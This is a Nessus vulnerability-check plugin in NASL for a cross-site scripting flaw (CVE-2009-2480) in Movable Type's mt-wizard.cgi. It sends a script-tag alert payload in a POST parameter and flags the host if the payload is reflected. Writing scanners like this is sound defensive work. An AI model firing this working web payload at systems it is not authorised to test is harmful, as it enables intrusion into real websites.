#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(39538);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2016/05/16 14:12:49 $");

  script_cve_id("CVE-2009-2480");
  script_bugtraq_id(35471);
  script_osvdb_id(55379);
  script_xref(name:"Secunia", value:"35534");

  script_name(english:"Movable Type mt-wizard.cgi set_static_uri_to Parameter XSS");
  script_summary(english:"Attempts a non-persistent XSS attack");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A Perl application hosted on the remote web server has a cross-site
scripting vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of Movable Type running on the remote host has a cross-
site scripting vulnerability in 'mt-wizard.cgi'.  Input to the
'set_static_uri_to' parameter is not sanitized.  A remote attacker could
exploit this by tricking a user into submitting a specially crafted POST
request, which would execute arbitrary script code in the context of the
web server. 

There is also reportedly a security bypass vulnerability in this version
of Movable Type, though Nessus has not checked for this issue."
  );
  # http://www.movabletype.org/documentation/appendices/release-notes/426.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?979a3eaf");
  script_set_attribute(attribute:"solution", value:"Upgrade to Movable Type version 4.26 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(79);

  script_set_attribute(attribute:"plugin_publication_date", value:"2009/06/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:sixapart:movable_type");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("cross_site_scripting.nasl", "movabletype_detect.nasl");
  script_require_keys("www/movabletype");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

port = get_http_port(default:80);

install = get_install_from_kb(
  appname : "movabletype",
  port    : port,
  exit_on_fail : TRUE
);

dir = install["dir"];
install_url = build_url(qs:dir, port:port);

unreserved = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*()-]/?=&";
xss = "<script>alert('" + SCRIPT_NAME + "')</script>";
encoded_xss = urlencode(str:xss, unreserved:unreserved);
expected_output = "<strong>Error: '" + xss + "' could not be found.";

postdata =
  '__mode=next_step&' +
  'step=pre_start&' +
  'config=&' +
  'set_static_uri_to=' + encoded_xss;

url = dir + '/mt-wizard.cgi';

res = http_send_recv3(
  port   : port,
  method : "POST",
  item   : url,
  data   : postdata,
  exit_on_fail : TRUE
);

if (expected_output >< res[2])
{
  set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

  if (report_verbosity > 0)
  {
    report =
      '\nNessus was able to exploit the issue using the following request :' +
      '\n' +
      '\n' + http_last_sent_request() +
      '\n';
    if (report_verbosity > 1)
    {
      output =  extract_pattern_from_resp(
        string  : res[2],
        pattern : 'ST:'+expected_output
      );
      snip = crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30);
      report +=
        '\nThis produced the following response :' +
        '\n' + snip +
        '\n' + output +
        '\n' + snip +
        '\n';
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}

# If we made it this far without exiting, none of the XSS attempts worked
audit(AUDIT_WEB_APP_NOT_AFFECTED, "Movable Type", install_url);
